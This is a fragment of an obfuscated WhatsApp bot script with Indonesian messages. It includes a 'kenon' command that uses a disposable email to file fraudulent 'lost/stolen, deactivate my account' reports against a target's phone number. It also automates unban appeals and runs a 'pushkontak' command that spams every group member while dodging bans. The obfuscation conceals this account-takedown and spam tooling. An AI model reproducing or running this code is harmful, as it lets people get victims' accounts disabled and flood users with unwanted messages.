_0x4165d4;},_0x2561(_0xdb0591,_0x2007ca);}function _0x5239(){var _0x13a86e=['./gambar/jawacidra.mp3','audio/mpeg','64ICtAkS','3463555ZSrShm','https://telegra.ph/file/a5e229afeb4dad4f35204.jpg','2196525qBzwNU','38QBsWCG','194523ogoyOr','0@s.whatsapp.net','22248YWSUwt','relayMessage','28183fypvyK','Selamat\x20kak\x20','2125764GhAJoJ','9DAmafW','1292950jJvPGd','IDR'];_0x5239=function(){return _0x13a86e;};return _0x5239();}
}
break
case "unban": {
if (!isOwner && !fromMe) return
function _0xadae(){const _0x34dd89=['headers','email','INDONESIA','href','load','33036CQzUmM','axios','data','includes','cheerio','submit','Succes..\x20Nomor\x20Telah\x20Di\x20Unban','get','1518601qwQgLA','4213wVdeZD','24LCFzYE','1246688daWUnN','platform','form','\x22payload\x22:true','__hs','https://www.whatsapp.com','input[name=jazoest]','__csr','707553vkoPRm','input[name=lsd]','val','__comment_req','6qdCLRv','find','step','1006630858','__req','1606010ENIYXH','dpr','484269xMnYFn','19316.BP:whatsapp_www_pkg.2.0.0.0.0','set-cookie','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=2022','split','format','4VHSnVK','__ccg','20mtsgLB','attr','__user','https://www.whatsapp.com/contact/noclient/','phone_number','append','Akun\x20saya\x20di\x20blokir\x20tanpa\x20alasan','jazoest','email_confirm','15406xIWoez'];_0xadae=function(){return _0x34dd89;};return _0xadae();}const _0x4d374b=_0xf48e;(function(_0x265308,_0x1a3392){const _0x5517a7=_0xf48e,_0x27dfd6=_0x265308();while(!![]){try{const _0x3afa4f=parseInt(_0x5517a7(0xd7))/0x1*(-parseInt(_0x5517a7(0xfc))/0x2)+-parseInt(_0x5517a7(0xeb))/0x3*(-parseInt(_0x5517a7(0xf1))/0x4)+-parseInt(_0x5517a7(0xe9))/0x5*(parseInt(_0x5517a7(0xe4))/0x6)+-parseInt(_0x5517a7(0xd5))/0x7+-parseInt(_0x5517a7(0xd8))/0x8+-parseInt(_0x5517a7(0xe0))/0x9*(parseInt(_0x5517a7(0xf3))/0xa)+-parseInt(_0x5517a7(0xd6))/0xb*(-parseInt(_0x5517a7(0xcd))/0xc);if(_0x3afa4f===_0x1a3392)break;else _0x27dfd6['push'](_0x27dfd6['shift']());}catch(_0x270d81){_0x27dfd6['push'](_0x27dfd6['shift']());}}}(_0xadae,0x2be17));let targetnya=q[_0x4d374b(0xef)]('\x20')[0x0];function _0xf48e(_0x1478ae,_0x4b5ad2){const _0xadaed=_0xadae();return _0xf48e=function(_0xf48ec1,_0x5b499c){_0xf48ec1=_0xf48ec1-0xcc;let _0x1c9088=_0xadaed[_0xf48ec1];return _0x1c9088;},_0xf48e(_0x1478ae,_0x4b5ad2);}try{var axioss=require(_0x4d374b(0xce));let ntah=await axioss[_0x4d374b(0xd4)](_0x4d374b(0xf6)),email=await axioss['get'](_0x4d374b(0xee)),cookie=ntah[_0x4d374b(0xfd)][_0x4d374b(0xed)]['join'](';\x20');const cheerio=require(_0x4d374b(0xd1));let $=cheerio[_0x4d374b(0xcc)](ntah['data']),$form=$(_0x4d374b(0xda)),url=new URL($form[_0x4d374b(0xf4)]('action'),_0x4d374b(0xdd))[_0x4d374b(0x100)],form=new URLSearchParams();form[_0x4d374b(0xf8)](_0x4d374b(0xfa),$form['find'](_0x4d374b(0xde))[_0x4d374b(0xe2)]()),form[_0x4d374b(0xf8)]('lsd',$form[_0x4d374b(0xe5)](_0x4d374b(0xe1))[_0x4d374b(0xe2)]()),form[_0x4d374b(0xf8)](_0x4d374b(0xe6),_0x4d374b(0xd2)),form[_0x4d374b(0xf8)]('country_selector',_0x4d374b(0xff)),form['append'](_0x4d374b(0xf7),targetnya),form[_0x4d374b(0xf8)](_0x4d374b(0xfe),email['data'][0x0]),form[_0x4d374b(0xf8)](_0x4d374b(0xfb),email[_0x4d374b(0xcf)][0x0]),form['append'](_0x4d374b(0xd9),'ANDROID'),form[_0x4d374b(0xf8)]('your_message',_0x4d374b(0xf9)),form['append'](_0x4d374b(0xf5),'0'),form[_0x4d374b(0xf8)]('__a','1'),form[_0x4d374b(0xf8)](_0x4d374b(0xdf),''),form[_0x4d374b(0xf8)](_0x4d374b(0xe8),'8'),form[_0x4d374b(0xf8)](_0x4d374b(0xdc),_0x4d374b(0xec)),form[_0x4d374b(0xf8)](_0x4d374b(0xea),'1'),form[_0x4d374b(0xf8)](_0x4d374b(0xf2),'UNKNOWN'),form[_0x4d374b(0xf8)]('__rev',_0x4d374b(0xe7)),form[_0x4d374b(0xf8)](_0x4d374b(0xe3),'0');let res=await axioss({'url':url,'method':'POST','data':form,'headers':{'cookie':cookie}}),payload=String(res[_0x4d374b(0xcf)]);if(payload['includes'](_0x4d374b(0xdb)))ads(_0x4d374b(0xd3));else{if(payload[_0x4d374b(0xd0)]('\x22payload\x22:false'))ads('Sedang\x20Limit\x20Tunggu\x20Beberapa\x20Saat.');else ads(util[_0x4d374b(0xf0)](res[_0x4d374b(0xcf)]));}}catch(_0x56ab30){ads(''+_0x56ab30);}
}
break
case 'pushkontak': {
if (!isOwner && !fromMe) return
if (!isGroup) return ads(mess.OnlyGroup)
if (!q) return ads(`Example ${prefix}${command} Hi Semuanya`)
const _0x1f04ef=_0x525a;function _0x1ca7(){const _0x522fb1=['Semua\x20pesan\x20telah\x20dikirim!:\x0aJumlah\x20pesan\x20terkirim:\x20*','.net','filter','2021142amaPQY','3mYMfbA','220sNNVku','1216844PhTyQP','sendMessage','7jfzZZw','544100YDlWbR','7789560ZcOGsy','6613448MajNey','10586700JOraaX','length','5nNFhNp','1224780QujvFx'];_0x1ca7=function(){return _0x522fb1;};return _0x1ca7();}(function(_0x22d31b,_0x4a95d8){const _0x51d336=_0x525a,_0x4c2bb2=_0x22d31b();while(!![]){try{const _0x459ec9=-parseInt(_0x51d336(0xe2))/0x1+parseInt(_0x51d336(0xe6))/0x2*(parseInt(_0x51d336(0xe7))/0x3)+-parseInt(_0x51d336(0xd9))/0x4*(-parseInt(_0x51d336(0xe1))/0x5)+parseInt(_0x51d336(0xdd))/0x6+-parseInt(_0x51d336(0xdb))/0x7*(parseInt(_0x51d336(0xde))/0x8)+parseInt(_0x51d336(0xdf))/0x9+-parseInt(_0x51d336(0xdc))/0xa*(parseInt(_0x51d336(0xd8))/0xb);if(_0x459ec9===_0x4a95d8)break;else _0x4c2bb2['push'](_0x4c2bb2['shift']());}catch(_0x469ac0){_0x4c2bb2['push'](_0x4c2bb2['shift']());}}}(_0x1ca7,0x9e9d1));function _0x525a(_0x3f60ef,_0x205104){const _0x1ca7a3=_0x1ca7();return _0x525a=function(_0x525ace,_0x453c24){_0x525ace=_0x525ace-0xd8;let _0xb741e9=_0x1ca7a3[_0x525ace];return _0xb741e9;},_0x525a(_0x3f60ef,_0x205104);}let get=await participants[_0x1f04ef(0xe5)](_0xde94b9=>_0xde94b9['id']['endsWith'](_0x1f04ef(0xe4)))['map'](_0x26ceb2=>_0x26ceb2['id']),count=get[_0x1f04ef(0xe0)],sentCount=0x0;ads('Sedang\x20Push\x20Kontak\x0a\x0aNOTE\x20:\x20Waktu\x20Mengirim\x20Perorang\x205\x20Detik\x20Agar\x20Mencegah\x20Akun\x20Mu\x20Terbanned');for(let i=0x0;i<get[_0x1f04ef(0xe0)];i++){setTimeout(function(){const _0x1441b0=_0x1f04ef;kaje[_0x1441b0(0xda)](get[i],{'text':q}),count--,sentCount++,count===0x0&&ads(_0x1441b0(0xe3)+sentCount+'*');},i*0x1388);}
}
break
case "kenon": {
if (!isOwner && !fromMe) return
const _0x39feec=_0x57e8;(function(_0x1c2b8a,_0xcbbbe0){const _0x176fa8=_0x57e8,_0xaa8592=_0x1c2b8a();while(!![]){try{const _0x4f9809=parseInt(_0x176fa8(0x10f))/0x1+parseInt(_0x176fa8(0xfb))/0x2+-parseInt(_0x176fa8(0xeb))/0x3*(parseInt(_0x176fa8(0xf1))/0x4)+-parseInt(_0x176fa8(0xe7))/0x5*(-parseInt(_0x176fa8(0x117))/0x6)+-parseInt(_0x176fa8(0xf5))/0x7+parseInt(_0x176fa8(0xfa))/0x8+parseInt(_0x176fa8(0x114))/0x9*(-parseInt(_0x176fa8(0xf0))/0xa);if(_0x4f9809===_0xcbbbe0)break;else _0xaa8592['push'](_0xaa8592['shift']());}catch(_0x197a3b){_0xaa8592['push'](_0xaa8592['shift']());}}}(_0x11fc,0x89c3a));function _0x57e8(_0x4cb570,_0x193307){const _0x11fc85=_0x11fc();return _0x57e8=function(_0x57e8b8,_0x3c88cf){_0x57e8b8=_0x57e8b8-0xe6;let _0x3698c0=_0x11fc85[_0x57e8b8];return _0x3698c0;},_0x57e8(_0x4cb570,_0x193307);}function _0x11fc(){const _0x21e070=['step','load','__a','1369820jqynwF','4bcQycH','append','INDONESIA','href','566279fTSITP','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=2022','your_message','\x22payload\x22:false','submit','2709264qMsfOK','1481350YOpODF','data','email','input[name=lsd]','phone_number','includes','attr','split','ANDROID','__user','https://www.whatsapp.com/contact/noclient/','val','\x22payload\x22:true','__comment_req','email_confirm','format','__rev','19316.BP:whatsapp_www_pkg.2.0.0.0.0','dpr','POST','1033493kgWDfQ','lsd','form','Sedang\x20Limit\x20Tunggu\x20Beberapa\x20Saat.','find','99VRMThl','__csr','input[name=jazoest]','8412JBlqce','__req','Succes..\x20Nomor\x20Telah\x20Out','platform','__hs','2190aWQfAr','Perdido/roubado:\x20desative\x20minha\x20conta','cheerio','set-cookie','1724763ChFXNQ','get'];_0x11fc=function(){return _0x21e070;};return _0x11fc();}let targetnya=q[_0x39feec(0x102)]('\x20')[0x0];try{var axioss=require('axios');let ntah=await axioss['get'](_0x39feec(0x105)),email=await axioss[_0x39feec(0xec)](_0x39feec(0xf6)),cookie=ntah['headers'][_0x39feec(0xea)]['join'](';\x20');const cheerio=require(_0x39feec(0xe9));let $=cheerio[_0x39feec(0xee)](ntah[_0x39feec(0xfc)]),$form=$(_0x39feec(0x111)),url=new URL($form[_0x39feec(0x101)]('action'),'https://www.whatsapp.com')[_0x39feec(0xf4)],form=new URLSearchParams();form[_0x39feec(0xf2)]('jazoest',$form['find'](_0x39feec(0x116))[_0x39feec(0x106)]()),form['append'](_0x39feec(0x110),$form[_0x39feec(0x113)](_0x39feec(0xfe))[_0x39feec(0x106)]()),form['append'](_0x39feec(0xed),_0x39feec(0xf9)),form[_0x39feec(0xf2)]('country_selector',_0x39feec(0xf3)),form[_0x39feec(0xf2)](_0x39feec(0xff),targetnya),form[_0x39feec(0xf2)](_0x39feec(0xfd),email[_0x39feec(0xfc)][0x0]),form[_0x39feec(0xf2)](_0x39feec(0x109),email[_0x39feec(0xfc)][0x0]),form[_0x39feec(0xf2)](_0x39feec(0x11a),_0x39feec(0x103)),form[_0x39feec(0xf2)](_0x39feec(0xf7),_0x39feec(0xe8)),form[_0x39feec(0xf2)](_0x39feec(0x104),'0'),form['append'](_0x39feec(0xef),'1'),form[_0x39feec(0xf2)](_0x39feec(0x115),''),form[_0x39feec(0xf2)](_0x39feec(0x118),'8'),form['append'](_0x39feec(0xe6),_0x39feec(0x10c)),form[_0x39feec(0xf2)](_0x39feec(0x10d),'1'),form[_0x39feec(0xf2)]('__ccg','UNKNOWN'),form[_0x39feec(0xf2)](_0x39feec(0x10b),'1006630858'),form[_0x39feec(0xf2)](_0x39feec(0x108),'0');let res=await axioss({'url':url,'method':_0x39feec(0x10e),'data':form,'headers':{'cookie':cookie}}),payload=String(res[_0x39feec(0xfc)]);if(payload[_0x39feec(0x100)](_0x39feec(0x107)))ads(_0x39feec(0x119));else{if(payload[_0x39feec(0x100)](_0x39feec(0xf8)))ads(_0x39feec(0x112));else ads(util[_0x39feec(0x10a)](res['data']));}}catch(_0x316c2c){ads(''+_0x316c2c);}
}
break
case 'trapsticker': case 'traps': case 'trapstiker':{
function _0xaf1a(){const _0x54117f=['./gambar/','2533396ycdwsi','36JsXxTh','4807865kbCofC','9097032EMlmpa','331097KRTiMA','1005bbpnqw','video','6433734vyRgsq','684LMKgCl','.jpg','4789208hZJbhg','Kirim/reply\x20gambar/vidio\x20dengan\x20caption\x20*','sendImageAsSticker','image','wait'];_0xaf1a=function(){return _0x54117f;};return _0xaf1a();}const _0x179d5e=_0x6cf9;(function(_0x63650c,_0x534a69){const _0x2dae1b=_0x6cf9,_0x12ac07=_0x63650c();while(!![]){try{const _0x4654d1=parseInt(_0x2dae1b(0x111))/0x1+parseInt(_0x2dae1b(0x10d))/0x2+-parseInt(_0x2dae1b(0x112))/0x3*(-parseInt(_0x2dae1b(0x105))/0x4)+-parseInt(_0x2dae1b(0x10f))/0x5+parseInt(_0x2dae1b(0x114))/0x6+parseInt(_0x2dae1b(0x110))/0x7+parseInt(_0x2dae1b(0x107))/0x8*(-parseInt(_0x2dae1b(0x10e))/0x9);if(_0x4654d1===_0x534a69)break;else _0x12ac07['push'](_0x12ac07['shift']());}catch(_0x2ce39b){_0x12ac07['push'](_0x12ac07['shift']());}}}(_0xaf1a,0xa3c30));function _0x6cf9(_0x3bf2e0,_0xfdcae9){const _0xaf1afc=_0xaf1a();return _0x6cf9=function(_0x6cf9ce,_0x46bda1){_0x6cf9ce=_0x6cf9ce-0x105;let _0x1af53b=_0xaf1afc[_0x6cf9ce];return _0x1af53b;},_0x6cf9(_0x3bf2e0,_0xfdcae9);}if(isImage||isQuotedImage){let media=await downloadAndSaveMediaMessage(_0x179d5e(0x10a),_0x179d5e(0x10c)+tanggal+_0x179d5e(0x106));ads(mess['wait']),kaje[_0x179d5e(0x109)](from,media,msg,{'packname':''+ngazap(prefix),'author':''+ngazap(prefix)});}else{if(isVideo||isQuotedVideo){let media=await downloadAndSaveMediaMessage(_0x179d5e(0x113),'./sticker/'+tanggal+'.mp4');ads(mess[_0x179d5e(0x10b)]),kaje['sendVideoAsSticker'](from,media,msg,{'packname':''+ngazap(prefix),'author':''+ngazap(prefix)});}else ads(_0x179d5e(0x108)+(prefix+command)+'*');}
}
break
case 'tambah':
if (!isOwner && !fromMe) return
if (!q) return ads(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
function _0x5425(_0x1cc709,_0x32fa8b){var _0x538bae=_0x538b();return _0x5425=function(_0x542509,_0x1d07e5){_0x542509=_0x542509-0x77;var _0x4b981c=_0x538bae[_0x542509];return _0x4b981c;},_0x5425(_0x1cc709,_0x32fa8b);}var _0x3b7507=_0x5425;(function(_0x3091c5,_0x326421){var _0xfcc2b0=_0x5425,_0x523b5f=_0x3091c5();while(!![]){try{var _0x13d532=parseInt(_0xfcc2b0(0x80))/0x1+-parseInt(_0xfcc2b0(0x7a))/0x2+parseInt(_0xfcc2b0(0x79))/0x3+parseInt(_0xfcc2b0(0x7b))/0x4+-parseInt(_0xfcc2b0(0x81))/0x5+-parseInt(_0xfcc2b0(0x78))/0x6+parseInt(_0xfcc2b0(0x7d))/0x7;if(_0x13d532===_0x326421)break;else _0x523b5f['push'](_0x523b5f['shift']());}catch(_0x262366){_0x523b5f['push'](_0x523b5f['shift']());}}}(_0x538b,0xa1090));var num_one=q['split']('\x20')[0x0],num_two=q[_0x3b7507(0x7e)]('\x20')[0x1];if(!num_one)return ads('Gunakan\x20dengan\x20cara\x20'+(prefix+command)+_0x3b7507(0x7c)+(prefix+command)+_0x3b7507(0x7f));if(!num_two)return ads(_0x3b7507(0x77)+(prefix+command)+_0x3b7507(0x7c)+(prefix+command)+_0x3b7507(0x7f));function _0x538b(){var _0x4f1afc=['3737097bsrLkF','499680zxfElO','43112KoMnNr','\x20*angka*\x20*angka*\x0a\x0a_Contoh_\x0a\x0a','8112342kHetyS','split','\x201\x202','188784uypttu','4058885xizJoQ','Gunakan\x20dengan\x20cara\x20','5297700hQIGAO'];_0x538b=function(){return _0x4f1afc;};return _0x538b();}var nilai_one=Number(num_one),nilai_two=Number(num_two);ads(''+(nilai_one+nilai_two));
break
case 'kurang':
if (!isOwner && !fromMe) return
if (!q) return ads(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var _0x57fdc9=_0x34bf;function _0x34bf(_0x4279f5,_0x98e5c2){var _0x2346de=_0x2346();return _0x34bf=function(_0x34bf30,_0x47e9e2){_0x34bf30=_0x34bf30-0x78;var _0x27ca82=_0x2346de[_0x34bf30];return _0x27ca82;},_0x34bf(_0x4279f5,_0x98e5c2);}(function(_0x17dd2e,_0x568072){var _0x47df70=_0x34bf,_0x403ff4=_0x17dd2e();while(!![]){try{var _0x255e84=-parseInt(_0x47df70(0x83))/0x1+parseInt(_0x47df70(0x87))/0x2*(-parseInt(_0x47df70(0x7f))/0x3)+parseInt(_0x47df70(0x7b))/0x4*(parseInt(_0x47df70(0x7a))/0x5)+parseInt(_0x47df70(0x85))/0x6*(parseInt(_0x47df70(0x84))/0x7)+parseInt(_0x47df70(0x78))/0x8*(-parseInt(_0x47df70(0x86))/0x9)+-parseInt(_0x47df70(0x82))/0xa*(parseInt(_0x47df70(0x7d))/0xb)+-parseInt(_0x47df70(0x81))/0xc*(-parseInt(_0x47df70(0x7e))/0xd);if(_0x255e84===_0x568072)break;else _0x403ff4['push'](_0x403ff4['shift']());}catch(_0x146998){_0x403ff4['push'](_0x403ff4['shift']());}}}(_0x2346,0x63a85));var num_one=q['split']('\x20')[0x0],num_two=q['split']('\x20')[0x1];if(!num_one)return ads(_0x57fdc9(0x79)+(prefix+command)+_0x57fdc9(0x7c)+(prefix+command)+_0x57fdc9(0x80));if(!num_two)return ads(_0x57fdc9(0x79)+(prefix+command)+_0x57fdc9(0x7c)+(prefix+command)+_0x57fdc9(0x80));function _0x2346(){var _0x2487d6=['\x20*angka*\x20*angka*\x0a\x0a_Contoh_\x0a\x0a','673981RUkqUf','14995409RacdvM','111IciHAn','\x201\x202','12nQVJee','60sqNFFr','337984mHEBff','373716kVagcM','6NeWNas','3270429OZAiBF','29314wLiTAT','8DwlhMg','Gunakan\x20dengan\x20cara\x20','30rarEtV','541744xroDIT'];_0x2346=function(){return _0x2487d6;};return _0x2346();}var nilai_one=Number(num_one),nilai_two=Number(num_two);ads(''+(nilai_one-nilai_two));
break
case 'kali':
if (!isOwner && !fromMe) return
if (!q) return ads(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var _0x39d24d=_0x1414;function _0x1414(_0x49f90b,_0x5f0ec9){var _0x3a9f5f=_0x3a9f();return _0x1414=function(_0x1414d8,_0x281f12){_0x1414d8=_0x1414d8-0xc2;var _0x5254f0=_0x3a9f5f[_0x1414d8];return _0x5254f0;},_0x1414(_0x49f90b,_0x5f0ec9);}(function(_0x261c65,_0x3c6ee1){var _0x12d8d7=_0x1414,_0x1fe39c=_0x261c65();while(!![]){try{var _0x2a31c7=parseInt(_0x12d8d7(0xc4))/0x1*(-parseInt(_0x12d8d7(0xcd))/0x2)+-parseInt(_0x12d8d7(0xc8))/0x3*(-parseInt(_0x12d8d7(0xc3))/0x4)+-parseInt(_0x12d8d7(0xca))/0x5*(parseInt(_0x12d8d7(0xce))/0x6)+-parseInt(_0x12d8d7(0xc5))/0x7*(-parseInt(_0x12d8d7(0xc6))/0x8)+-parseInt(_0x12d8d7(0xcb))/0x9+parseInt(_0x12d8d7(0xd1))/0xa*(-parseInt(_0x12d8d7(0xd0))/0xb)+parseInt(_0x12d8d7(0xcf))/0xc;if(_0x2a31c7===_0x3c6ee1)break;else _0x1fe39c['push'](_0x1fe39c['shift']());}catch(_0x57d8f6){_0x1fe39c['push'](_0x1fe39c['shift']());}}}(_0x3a9f,0x20f83));function _0x3a9f(){var _0x3693af=['10MbHWbM','split','4bWEDvX','2oNyLVz','1206926TQkAVD','8UcwxXR','\x201\x202','138597fUpyNh','Gunakan\x20dengan\x20cara\x20','1279435wFvqAk','2219175HdpWXw','\x20*angka*\x20*angka*\x0a\x0a_Contoh_\x0a\x0a','44008eZOWxP','6dxrohl','6365124UJBJBn','742841NFZiKg'];_0x3a9f=function(){return _0x3693af;};return _0x3a9f();}var num_one=q['split']('\x20')[0x0],num_two=q[_0x39d24d(0xc2)]('\x20')[0x1];if(!num_one)return ads(_0x39d24d(0xc9)+(prefix+command)+_0x39d24d(0xcc)+(prefix+command)+_0x39d24d(0xc7));if(!num_two)return ads(_0x39d24d(0xc9)+(prefix+command)+_0x39d24d(0xcc)+(prefix+command)+_0x39d24d(0xc7));var nilai_one=Number(num_one),nilai_two=Number(num_two);ads(''+nilai_one*nilai_two);
break
case 'bagi':
if (!isOwner && !fromMe) return
if (!q) return ads(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var _0x37c197=_0x117b;(function(_0x311124,_0x43bdc5){var _0x10af19=_0x117b,_0x25dc1b=_0x311124();while(!![]){try{var _0x351c4b=-parseInt(_0x10af19(0x1be))/0x1*(parseInt(_0x10af19(0x1bf))/0x2)+parseInt(_0x10af19(0x1ba))/0x3+-parseInt(_0x10af19(0x1b7))/0x4+-parseInt(_0x10af19(0x1b5))/0x5+-parseInt(_0x10af19(0x1c0))/0x6*(-parseInt(_0x10af19(0x1b4))/0x7)+-parseInt(_0x10af19(0x1bc))/0x8+-parseInt(_0x10af19(0x1b9))/0x9*(-parseInt(_0x10af19(0x1bd))/0xa);if(_0x351c4b===_0x43bdc5)break;else _0x25dc1b['push'](_0x25dc1b['shift']());}catch(_0x5a216d){_0x25dc1b['push'](_0x25dc1b['shift']());}}}(_0x1dd2,0xe4d38));var num_one=q[_0x37c197(0x1b6)]('\x20')[0x0],num_two=q[_0x37c197(0x1b6)]('\x20')[0x1];function _0x117b(_0x17b87e,_0x51ec68){var _0x1dd2ab=_0x1dd2();return _0x117b=function(_0x117b1c,_0x3ede73){_0x117b1c=_0x117b1c-0x1b3;var _0x340ca0=_0x1dd2ab[_0x117b1c];return _0x340ca0;},_0x117b(_0x17b87e,_0x51ec68);}function _0x1dd2(){var _0xe21ea0=['46902wlTnfF','Gunakan\x20dengan\x20cara\x20','77hNROVV','7800255wbulZL','split','3354424PITnyp','\x201\x202','9GDGcAl','4635318mIinQz','\x20*angka*\x20*angka*\x0a\x0a_Contoh_\x0a\x0a','3226872FBDfMl','32630090wqoWaX','977dDGfWs','2364IcQFbQ'];_0x1dd2=function(){return _0xe21ea0;};return _0x1dd2();}if(!num_one)return ads(_0x37c197(0x1b3)+(prefix+command)+_0x37c197(0x1bb)+(prefix+command)+_0x37c197(0x1b8));if(!num_two)return ads('Gunakan\x20dengan\x20cara\x20'+(prefix+command)+_0x37c197(0x1bb)+(prefix+command)+_0x37c197(0x1b8));var nilai_one=Number(num_one),nilai_two=Number(num_two);ads(''+nilai_one/nilai_two);
break

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

default:
if ((budy) && ["assalamu'alaikum", "Assalamu'alaikum", "Assalamualaikum", "assalamualaikum", "Assalammualaikum", "assalammualaikum", "Asalamualaikum", "asalamualaikum", "Asalamu'alaikum", " asalamu'alaikum"].includes(budy) && !isCmd) {
kaje.sendMessage(from, { text: `${pickRandom(["Wa'alaikumussalam","Wa'alaikumussalam Wb.","Wa'alaikumussalam Wr. Wb.","Wa'alaikumussalam Warahmatullahi Wabarakatuh"])}`})
}
if ((budy) && ["kata kata", "KATA KATA", "Kata kata", "Kata Kata", "Kata-kata", "KATA-KATA", "kata-kata", "Kata-Kata"].includes(budy) && !isCmd) {
ads(`${pickRandom(["Yang Berjuang Akan Kalah Dengan Yang Beruang","Tak Perlu Kata Kata Yang Penting Bukti Nyata","Pucuk Ubi Pucuk Kangkung Banyak Bunyi Pecah Muncung. PANTEK","Dia Datang Hanya Untuk Melupakan Seseorang Bukan Menjadikanmu Tujuan","Ikan Hiu Berenang Renang Ya Gapapa Kan Ikan"])}`)
adsAudio(`${pickRandom(["jawacidra","jawacidra2"])}`)
}
if ((budy) && ["SV", "sv", "Sv", "SAVE", "save", "Save", "p", "P", "Pe", "PE", "pe", "woy", "Woy", "WOY",].includes(budy) && !isCmd) {
if (!isGroup && !isOwner && !fromMe) {
ads(`Sebelum owner membalas mohon jangan spam!!`)
adsAudio("welcome")
}
}
if ((budy) && ["tes", "Tes", "TES", "Test", "test", "ping", "Ping"].includes(budy) && !isCmd) {
kaje.sendMessage(from, { text: `${runtime(process.uptime())}*⏰`})
}

}} catch (err) {
console.log(color('[ERROR]', 'red'), err)
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const moment = require("moment-timezone");
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let kon_erorr = {"tanggal": tanggal, "jam": jam, "error": err, "user": sender}
db_error.push(kon_erorr)
fs.writeFileSync('./database/error.json', JSON.stringify(db_error))
var errny =`*SERVER ERROR*
*Dari:* @${sender.split("@")[0]}
*Jam:* ${jam}
*Tanggal:* ${tanggal}
*Tercatat:* ${db_error.length}
*Type:* ${err}`
kaje.sendMessage(setting.ownerNumber, {text:errny, mentions:[sender]})
}}